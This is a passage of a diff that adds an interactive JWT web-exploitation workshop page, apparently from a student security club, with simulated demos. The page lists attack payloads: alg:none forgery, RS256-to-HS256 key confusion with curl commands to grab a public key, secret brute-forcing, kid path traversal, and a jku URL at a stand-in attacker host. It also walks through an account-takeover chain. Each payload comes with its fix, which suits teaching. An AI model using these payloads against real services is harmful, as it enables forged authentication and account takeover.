+  wild. Watch the wordlist below try — each attempt is local, silent, and instantaneous.</p>
+
+  <div class="row" style="margin-top:10px">
+    <button onclick="runBrute()">Start brute-force (simulated)</button>
+    <button class="ghost" onclick="stopBrute()">Stop</button>
+  </div>
+  <div class="jt-wordlist" id="wordlist"></div>
+  <div id="bruteStatus" class="status"></div>
+
+  <p class="lead" style="margin-top:1rem;font-size:13.5px"><b>The fix:</b> a long, random secret (32+
+  bytes of entropy) — never a word, never a project name, never <code>secret</code>. And rotate it on a
+  schedule.</p>
+</section>
+
+<!-- ============================================================ STEP 7 -->
+<section id="s7">
+  <div class="step">Step 7 — more ways in</div>
+  <h2>Same idea, different disguise</h2>
+  <p class="lead">The header is more than <code>alg</code>. Every field in it is attacker-controlled and
+  often trusted. Here are four more surfaces, and what each one lets you do.</p>
+
+  <div class="xv-wrap">
+    <div class="xv-title">Attack surfaces in a JWT</div>
+    <div class="jt-opgrid" id="jtOpGrid">
+      <div class="jt-op" id="jo1"><div class="name">🧩 alg: none</div>
+        <div class="row2"><code>"alg":"none"</code></div>
+        <div class="row2">If the library accepts it, no signature check happens at all. See Step 4.</div></div>
+      <div class="jt-op" id="jo2"><div class="name">🔀 alg confusion</div>
+        <div class="row2"><code>RS256 → HS256</code></div>
+        <div class="row2">Use the public key as an HMAC secret. See Step 5.</div></div>
+      <div class="jt-op" id="jo3"><div class="name">🪝 kid injection</div>
+        <div class="row2"><code>"kid":"../../etc/passwd"</code></div>
+        <div class="row2">If <code>kid</code> is used to pick a key file, point it at a path you control — or a known file whose first bytes you can predict.</div></div>
+      <div class="jt-op" id="jo4"><div class="name">🌐 jku / x5u</div>
+        <div class="row2"><code>"jku":"https://evil/keys.json"</code></div>
+        <div class="row2">If the server fetches the keyset from a URL you supply, host your own keys and sign with them.</div></div>
+      <div class="jt-op" id="jo5"><div class="name">📭 empty signature</div>
+        <div class="row2"><code>header.payload.</code></div>
+        <div class="row2">Some parsers treat a trailing dot as "signature optional". A trailing empty signature must always be rejected.</div></div>
+      <div class="jt-op" id="jo6"><div class="name">🕳️ null byte / padding</div>
+        <div class="row2"><code>role="admin\u0000"</code></div>
+        <div class="row2">Some JSON parsers truncate on NUL or on trailing spaces — a value that "isn't admin" during the check can be admin after the parse.</div></div>
+    </div>
+  </div>
+
+  <div class="payloads" id="payloadList" style="margin-top:1rem"></div>
+</section>
+
+<!-- ============================================================ STEP 8 -->
+<section id="s8">
+  <div class="step">Step 8 — from role change to account takeover</div>
+  <h2>Why a JWT bug is almost never "just one flag"</h2>
+  <p class="lead">A working JWT exploit proves you can control the claims the server trusts. From there it's
+  a short walk to changing <i>who you are</i>, not just what you're allowed to do.</p>
+
+  <div class="jt-ladder" id="ladder">
+    <div class="jt-rung" id="l1"><span class="lvl">guest</span><span>Read public pages</span><span class="tag2">start</span></div>
+    <div class="jt-rung" id="l2"><span class="lvl">user</span><span>Read your own data</span><span class="tag2">you are here</span></div>
+    <div class="jt-rung" id="l3"><span class="lvl">staff</span><span>Read team data</span><span class="tag2"></span></div>
+    <div class="jt-rung" id="l4"><span class="lvl">admin</span><span>Manage users, read everything</span><span class="tag2"></span></div>
+    <div class="jt-rung" id="l5"><span class="lvl">superadmin</span><span>Manage admins, issue tokens</span><span class="tag2"></span></div>
+  </div>
+  <div class="row"><button onclick="runLadder()">Climb the ladder</button></div>
+
+  <div class="xv-wrap" style="margin-top:1.2rem">
+    <div class="xv-title">One claim → every permission → full account takeover</div>
+    <div class="xv-hijack">
+      <div class="xv-hpanel"><span class="xv-ico">🎫</span>One token<br>you can read</div>
+      <div class="xv-harrow"><span>➜</span></div>
+      <div class="xv-hpanel"><span class="xv-ico">🔓</span>Any claim<br>you want</div>
+      <div class="xv-harrow"><span>➜</span></div>
+      <div class="xv-hpanel xv-win"><span class="xv-ico">🕶️</span>Act as<br>any user</div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="xv-title" style="margin-bottom:8px">A realistic chain</div>
+    <div class="steps" id="chainSteps">
+      <div id="cs1"><b>1.</b> The app issues HS256 tokens. The secret is <code>secret</code> — found by offline brute-force in under a second.</div>
+      <div id="cs2"><b>2.</b> The attacker forges a token with <code>"role":"admin"</code>, signed with that secret.</div>
+      <div id="cs3"><b>3.</b> They call <code>/api/admin/users</code> — the server sees role admin and hands back every user record.</div>
+      <div id="cs4"><b>4.</b> They call <code>PATCH /api/users/1</code> with a new email, hit "forgot password", and take over the real admin account.</div>
+    </div>
+  </div>
+
+  <p class="lead">Ask yourself every time: <b>what claims does the server trust, and what did it do to make
+  sure those claims are the ones it issued?</b></p>
+</section>
+
+</main>
+<footer>Securinets Esprit — Web Exploitation Workshop</footer>
+
+<script>
+/* ================= helpers ================= */
+function decodeHtml(s){ const t=document.createElement('textarea'); t.innerHTML=s; return t.value; }
+
+function b64uEncode(str){
+  return btoa(unescape(encodeURIComponent(str))).replace(/\+/g,'-').replace(/\//g,'_').replace(/=+$/,'');
+}
+function b64uDecode(str){
+  str = str.replace(/-/g,'+').replace(/_/g,'/');
+  while(str.length % 4) str += '=';
+  try { return decodeURIComponent(escape(atob(str))); } catch(e){ return '(invalid base64)'; }
+}
+
+/* deterministic "HMAC" for the demo — same input → same output, changed input → different output */
+function fakeHmac(data, secret){
+  let h = 5381;
+  const s = data + '|' + secret;
+  for(let i=0;i<s.length;i++) h = ((h << 5) + h + s.charCodeAt(i)) >>> 0;
+  let out = '';
+  for(let i=0;i<8;i++){
+    h = ((h << 5) + h + i) >>> 0;
+    out += h.toString(16).padStart(8,'0');
+  }
+  return out.slice(0,43);
+}
+
+const typeTimers = {};
+function typeInto(screen, html, speed){
+  speed = speed || 55;
+  if(typeTimers[screen.id]) clearInterval(typeTimers[screen.id]);
+  const lines = html.split('\n');
+  let out = '', idx = 0;
+  screen.innerHTML = '<span class="jt-caret"></span>';
+  typeTimers[screen.id] = setInterval(()=>{
+    if(idx >= lines.length){
+      clearInterval(typeTimers[screen.id]);
+      screen.innerHTML = out + '<span class="jt-caret"></span>';
+      return;
+    }
+    out += (idx>0 ? '\n' : '') + lines[idx];
+    screen.innerHTML = out + '<span class="jt-caret"></span>';
+    idx++;
+  }, speed);
+}
+
+/* ================= the token state ================= */
+const SECRET = 's3cr3t-demo-key';
+const BASE_HEADER = { alg:'HS256', typ:'JWT' };
+const BASE_PAYLOAD = { sub:'7', name:'alice', role:'user', iat:1731000000 };
+
+let state = {
+  header: Object.assign({}, BASE_HEADER),
+  payload: Object.assign({}, BASE_PAYLOAD),
+  tampered: false,
+  verify: true
+};
+
+function jsonPretty(obj){
+  return JSON.stringify(obj, null, 2);
+}
+
+function currentToken(){
+  const h = b64uEncode(JSON.stringify(state.header));
+  const p = b64uEncode(JSON.stringify(state.payload));
+  const sig = state.tampered ? 'INVALID_SIGNATURE_XXXXXXXXXXXX_YYYYYYYYYYYY' : fakeHmac(h+'.'+p, SECRET);
+  return {h, p, sig, full: h+'.'+p+'.'+sig};
+}
+
+function renderToken(){
+  const t = currentToken();
+  const el = document.getElementById('tokenEl');
+  const hdr = document.getElementById('tokHdr');
+  const pld = document.getElementById('tokPld');
+  const sig = document.getElementById('tokSig');
+  const verdict = document.getElementById('viewerVerdict');
+  const viewer = document.getElementById('viewer');
+
+  hdr.textContent = t.h;
+  pld.textContent = t.p;
+  sig.textContent = t.sig;
+
+  if(state.tampered){
+    el.classList.add('jt-broken');
+    verdict.textContent = '✗ signature invalid';
+    verdict.className = 'verdict bad';
+    viewer.classList.add('alert');
+  } else {
+    el.classList.remove('jt-broken');
+    verdict.textContent = '✓ signature valid';
+    verdict.className = 'verdict ok';
+    viewer.classList.remove('alert');
+  }
+
+  /* decoded cards */
+  document.getElementById('dcHdrPre').innerHTML = highlightJson(jsonPretty(state.header));
+  document.getElementById('dcPldPre').innerHTML = highlightJson(jsonPretty(state.payload));
+  document.getElementById('dcSigPre').textContent = state.tampered
+    ? 'signature is deterministic bytes — you can\'t read anything out of it, but you can see it changed'
+    : 'signature is deterministic bytes — you can\'t read anything out of it';
+  ['dcHdr','dcPld','dcSig'].forEach(id=>document.getElementById(id).classList.add('show'));
+
+  /* server line */
+  document.getElementById('serverLineVal').textContent = 'Bearer ' + t.full.slice(0, 40) + '…';
+
+  /* payload card */
+  document.getElementById('payloadCardVal').textContent = jsonPretty(state.payload);
+}
+
+function highlightJson(str){
+  return str
+    .replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')
+    .replace(/"([^"]+)":/g, '<span class="key">"$1"</span>:')
+    .replace(/: "([^"]*)"/g, ': <span class="str">"$1"</span>')
+    .replace(/: (\d+)/g, ': <span class="str">$1</span>');
+}
+
+/* ================= step 1 + 2: tamper ================= */
+function tamperRole(){
+  const role = document.getElementById('roleSelect').value;
+  const before = JSON.stringify(state.payload);
+  state.payload = Object.assign({}, state.payload, { role });
+  const after = JSON.stringify(state.payload);
+  state.tampered = true;
+
+  /* shake the payload segment */
+  const pld = document.getElementById('tokPld');
+  pld.classList.remove('tampered'); void pld.offsetWidth; pld.classList.add('tampered');
+
+  renderToken();
+  playBoundary('tampered');
+  flashTerm();
+
+  const st = document.getElementById('tamperStatus');
+  const verify = document.getElementById('verifyToggle').checked;
+
+  if(verify){
+    st.className = 'status danger';
+    st.textContent = 'The payload changed, so the signature no longer matches — the server will reject this token.';
+    typeInto(document.getElementById('jtConsole'),
+`<span class="hdr">$ curl -s -H "Authorization: Bearer ${currentToken().h}.${currentToken().p}.${currentToken().sig}" \\</span>
+<span class="hdr">       https://app.example/api/admin/users</span>
+
+HTTP/1.1 401 Unauthorized
+Content-Type: application/json
+
+<span class="err">{"error":"invalid signature"}</span>`);
+  } else {
+    st.className = 'status danger';
+    st.textContent = 'You changed the payload, and the server is NOT checking the signature — it accepts the new role.';
+    typeInto(document.getElementById('jtConsole'),
+`<span class="hdr">$ curl -s -H "Authorization: Bearer ${currentToken().h}.${currentToken().p}.${currentToken().sig}" \\</span>
+<span class="hdr">       https://app.example/api/admin/users</span>
+
+HTTP/1.1 200 OK
+Content-Type: application/json
+
+<span class="ok">[{ "id":1, "email":"admin@app.example", "role":"admin" },
+ { "id":2, "email":"bob@corp.example",   "role":"staff" },
+ ... ]</span>
+
+<span class="warn">[simulated] server trusted the payload — role is now "${role}".</span>`);
+  }
+
+  /* verify rows */
+  ['vr1','vr2','vr3','vr4'].forEach(id=>document.getElementById(id).classList.remove('on','ok','bad'));
+  [1,2,3,4].forEach((n,i)=>{
+    setTimeout(()=>{
+      const row = document.getElementById('vr'+n);
+      row.classList.add('on');
+      if(n===3){
+        if(verify){ row.classList.add('bad'); row.querySelector('.icon').textContent = '✗'; }
+        else       { row.classList.add('ok');  row.querySelector('.icon').textContent = '✓'; }
+      }
+      if(n===4){
+        if(verify){ row.classList.add('bad'); row.querySelector('.icon').textContent = '✗'; }
+        else       { row.classList.add('ok');  row.querySelector('.icon').textContent = '✓'; }
+      }
+    }, i * 220);
+  });
+
+  playTimeline();
+}
+
+function resetToken(){
+  state = {
+    header: Object.assign({}, BASE_HEADER),
+    payload: Object.assign({}, BASE_PAYLOAD),
+    tampered: false,
+    verify: document.getElementById('verifyToggle').checked
+  };
+  renderToken();
+  document.getElementById('tamperStatus').className = 'status';
+  document.getElementById('tamperStatus').textContent = '';
+  document.getElementById('jtConsole').innerHTML = 'waiting for a request<span class="jt-caret"></span>';
+  ['vr1','vr2','vr3','vr4'].forEach(id=>{
+    const r = document.getElementById(id);
+    r.classList.remove('on','ok','bad');
+    r.querySelector('.icon').textContent = '·';
+  });
+  resetTimeline();
+  playBoundary('clean');
+}
+
+document.getElementById('verifyToggle').addEventListener('change', e=>{
+  state.verify = e.target.checked;
+  if(state.tampered) tamperRole();
+});
+
+/* ================= step 1/2: boundary ================= */
+const ball = document.getElementById('xvBall');
+const zoneData = document.getElementById('xvZoneData');
+const zoneCode = document.getElementById('xvZoneCode');
+const caption = document.getElementById('xvCaption');
+
+function playBoundary(mode){
+  zoneData.classList.remove('xv-calm');
+  zoneCode.classList.remove('xv-hot');
+  ball.classList.remove('xv-fire-safe','xv-fire-danger');
+  void ball.offsetWidth;
+
+  if(mode === 'clean'){
+    ball.classList.add('xv-fire-safe');
+    setTimeout(()=>zoneData.classList.add('xv-calm'), 550);
+    caption.textContent = 'Clean token: the payload is signed, the server can trust it.';
+  } else {
+    ball.classList.add('xv-fire-danger');
+    setTimeout(()=>zoneCode.classList.add('xv-hot'), 550);
+    caption.textContent = 'Tampered payload: the signature no longer matches — unless the server stops checking.';
+  }
+}
+
+/* ================= step 2: terminal flash + timeline ================= */
+const flashBox = document.getElementById('xvTermFlash');
+const tlIds = ['xvT1','xvT2','xvT3','xvT4'];
+function resetTimeline(){ tlIds.forEach(id => document.getElementById(id).classList.remove('on')); }
+function playTimeline(){
+  resetTimeline();
+  tlIds.forEach((id, i)=>setTimeout(()=>document.getElementById(id).classList.add('on'), 150 + i * 260));
+  flashBox.classList.remove('xv-pulse');
+  void flashBox.offsetWidth;
+  flashBox.classList.add('xv-pulse');
+}
+function flashTerm(){
+  flashBox.classList.remove('xv-pulse');
+  void flashBox.offsetWidth;
+  flashBox.classList.add('xv-pulse');
+}
+
+/* ================= step 4: alg none ================= */
+function runNoneAttack(){
+  const st = document.getElementById('noneStatus');
+  const card = document.getElementById('algNoneCard');
+  const screen = document.getElementById('jtNoneConsole');
+
+  /* animate the header + payload values into "none" + admin */
+  const hdrVal = document.getElementById('algNoneVal');
+  const pldVal = document.getElementById('algNonePld');
+  const sigVal = document.getElementById('algNoneSig');
+
+  hdrVal.innerHTML = '{ "alg":<span class="val">"none"</span>, "typ":"JWT" }';
+  pldVal.innerHTML = '{ "sub":"7", "name":"alice", "role":<span class="val">"admin"</span> }';
+  sigVal.innerHTML = '<span class="val">(empty)</span>';
+
+  hdrVal.classList.remove('pulse'); void hdrVal.offsetWidth; hdrVal.classList.add('pulse');
+  pldVal.classList.remove('pulse'); void pldVal.offsetWidth; pldVal.classList.add('pulse');
+  sigVal.classList.remove('pulse'); void sigVal.offsetWidth; sigVal.classList.add('pulse');
+
+  const h = b64uEncode(JSON.stringify({alg:'none', typ:'JWT'}));
+  const p = b64uEncode(JSON.stringify({sub:'7', name:'alice', role:'admin'}));
+  const forged = h + '.' + p + '.';
+
+  st.className = 'status danger';
+  st.textContent = 'Header says alg:none. Signature is empty. A vulnerable library will skip the check entirely.';
+
+  typeInto(screen,
+`<span class="hdr">$ curl -s -H "Authorization: Bearer ${forged}" \\</span>
+<span class="hdr">       https://app.example/api/admin/users</span>
+
+<span class="warn">-- verifier called --</span>
+<span class="warn">alg = "none" → skipping signature verification</span>
+
+HTTP/1.1 200 OK
+Content-Type: application/json
+
+<span class="ok">[{ "id":1, "email":"admin@app.example", "role":"admin" },
+ { "id":2, "email":"bob@corp.example",   "role":"staff" },
+ ... ]</span>
+
+<span class="err">[simulated] a patched library rejects alg:none by default. Yours should too.</span>`);
+}
+
+/* ================= step 5: algorithm confusion ================= */
+function runConfusionAttack(){
+  const st = document.getElementById('confStatus');
+  const screen = document.getElementById('jtConfConsole');
+  const dot = document.getElementById('confDot');
+  const cap = document.getElementById('confCaption');
+
+  dot.classList.remove('go'); void dot.offsetWidth; dot.classList.add('go');
+  cap.textContent = 'Public key used as an HMAC secret — same bytes, two meanings.';
+
+  const h = b64uEncode(JSON.stringify({alg:'HS256', typ:'JWT'}));
+  const p = b64uEncode(JSON.stringify({sub:'7', name:'alice', role:'admin'}));
+  const sig = fakeHmac(h+'.'+p, '-----BEGIN PUBLIC KEY-----MIIBIjANBgkqh…');
+  const forged = h + '.' + p + '.' + sig;
+
+  st.className = 'status danger';
+  st.textContent = 'The token claims HS256. The server, told to verify RS256, will now use the public key as an HMAC secret — exactly what the attacker did.';
+
+  typeInto(screen,
+`<span class="hdr">$ # 1. grab the server's public key (it's public by design)</span>
+<span class="hdr">$ curl -s https://victim/.well-known/jwks.json | jq -r '.keys[0].x5c[0]' | base64 -d > pub.pem</span>
+
+<span class="hdr">$ # 2. forge a token with alg=HS256, signed with pub.pem</span>
+<span class="hdr">$ python3 forge.py --alg HS256 --role admin --key pub.pem</span>
+token: ${forged.slice(0, 60)}…
+
+<span class="hdr">$ # 3. present it</span>
+<span class="hdr">$ curl -s -H "Authorization: Bearer ${forged.slice(0, 60)}…" https://victim/api/admin/users</span>
+
+<span class="warn">-- verifier: token says HS256 --</span>
+<span class="warn">-- verifier: configured for RS256, but header wins --</span>
+<span class="warn">-- verifier: HMAC(pub.pem) matches --</span>
+
+HTTP/1.1 200 OK
+<span class="ok">[{ "id":1, "email":"admin@victim", "role":"admin" }, ...]</span>
+
+<span class="err">[simulated] a patched library pins algorithms and ignores the header's request.</span>`);
+}
+
+/* ================= step 6: brute force ================= */
+const WORDLIST = [
+  'secret','password','123456','admin','jwt','token','key','changeme',
+  'letmein','qwerty','hunter2','s3cr3t','myapp','supersecret','dev',
+  'test','demo','1234567890','iloveyou','welcome'
+];
+let bruteTimer = null;
+function runBrute(){
+  stopBrute();
+  const el = document.getElementById('wordlist');
+  const st = document.getElementById('bruteStatus');
+  el.innerHTML = '';
+  WORDLIST.forEach(w=>{
+    const d = document.createElement('div');
+    d.className = 'w';
+    d.id = 'w_' + w;
+    d.innerHTML = `<span>${w}</span><span class="badge3" data-state="pending">queued</span>`;
+    el.appendChild(d);
+  });
+
+  let i = 0;
+  bruteTimer = setInterval(()=>{
+    if(i >= WORDLIST.length){
+      stopBrute();
+      st.className = 'status danger';
+      st.textContent = 'Secret found in the wordlist. Every token ever signed with it is now forgeable — retroactively.';
+      return;
+    }
+    const w = WORDLIST[i];
+    const d = document.getElementById('w_' + w);
+    d.classList.add('trying');
+    const badge = d.querySelector('.badge3');
+    badge.textContent = 'trying…';
+    badge.dataset.state = 'trying';
+
+    setTimeout(()=>{
+      d.classList.remove('trying');
+      d.classList.add('hit');
+      badge.textContent = 'MATCH';
+      badge.dataset.state = 'hit';
+      st.className = 'status danger';
+      st.textContent = 'Secret is "' + w + '". Offline, no rate limit. Took milliseconds.';
+    }, 160);
+
+    i++;
+  }, 320);
+}
+function stopBrute(){
+  if(bruteTimer){ clearInterval(bruteTimer); bruteTimer = null; }
+}
+
+/* ================= step 7: payload list ================= */
+const payloads = [
+  {code:'{"alg":"none"}  +  trailing dot',
+   why:'The classic. Server must reject <code>alg:none</code> outright and require a signature. See Step 4.'},
+  {code:'"alg":"HS256"  when server expects RS256',
+   why:'Algorithm confusion. Server must pin the algorithm, never trust the header. See Step 5.'},
+  {code:'"kid":"../../../../dev/null"',
+   why:'<code>kid</code> is a key id. If the server opens a file by that id, an empty <code>dev/null</code> is a known secret — sign with it and the server verifies with it.'},
+  {code:'"jku":"https://attacker.example/keys.json"',
+   why:'If the server fetches its key set from <code>jku</code>, host your own JWKS on that URL. The server will fetch your key and verify your token with it.'},
+  {code:'role: "user "  (trailing space)',
+   why:'Some comparisons use <code>==</code> or normalise whitespace later than the check. <code>"user "</code> can pass a "not admin" check but read as admin downstream.'},
+  {code:'role: "user\\u0000admin"',
+   why:'Some parsers truncate on NUL. The role check sees "user\\u0000…" and the string comparison may fail closed; downstream code sees "admin".'}
+];
+const listEl = document.getElementById('payloadList');
+payloads.forEach(p=>{
+  const d = document.createElement('div');
+  d.className = 'pl';
+  d.innerHTML = `<code>${p.code.replace(/</g,'&lt;').replace(/>/g,'&gt;')}</code><div class="why">${p.why}</div>`;
+  listEl.appendChild(d);
+});
+
+/* ================= step 8: ladder ================= */
+function runLadder(){
+  const order = ['l1','l2','l3','l4','l5'];
+  order.forEach(id=>{
+    const el = document.getElementById(id);
+    el.classList.remove('current','reached');
+  });
+  order.forEach((id, i)=>{
+    setTimeout(()=>{
+      const el = document.getElementById(id);
+      order.forEach(x=>document.getElementById(x).classList.remove('current'));
+      el.classList.add('current','reached');
+      setTimeout(()=>el.classList.remove('reached'), 900);
+    }, i * 520);
+  });
+}
+
+/* ================= staggered reveals ================= */
+function staggerIn(els, step){
+  if(!els.length) return;
+  if('IntersectionObserver' in window){
+    const io = new IntersectionObserver((entries)=>{
+      entries.forEach(entry=>{
+        if(entry.isIntersecting){
+          els.forEach((el, i)=>setTimeout(()=>el.classList.add('show'), i * step));
+          io.disconnect();
+        }
+      });
+    }, {threshold:.25});
+    io.observe(els[0]);
+  } else {
+    els.forEach(el=>el.classList.add('show'));
+  }
+}
+staggerIn(['jo1','jo2','jo3','jo4','jo5','jo6'].map(id=>document.getElementById(id)).filter(Boolean), 110);
+
+/* chain steps in step 8 */
+(function(){
+  const steps = ['cs1','cs2','cs3','cs4'].map(id=>document.getElementById(id)).filter(Boolean);
+  if(!steps.length) return;
+  if('IntersectionObserver' in window){
+    const io = new IntersectionObserver((entries)=>{
+      entries.forEach(entry=>{
+        if(entry.isIntersecting){
+          steps.forEach((el, i)=>setTimeout(()=>el.classList.add('show'), i * 180));
+          io.disconnect();
+        }
+      });
+    }, {threshold:.4});
+    io.observe(steps[0]);
+  } else {
+    steps.forEach(el=>el.classList.add('show'));
+  }
+})();
+
+/* ================= boot ================= */
+renderToken();
+playBoundary('clean');
+</script>
+</body>
+</html>
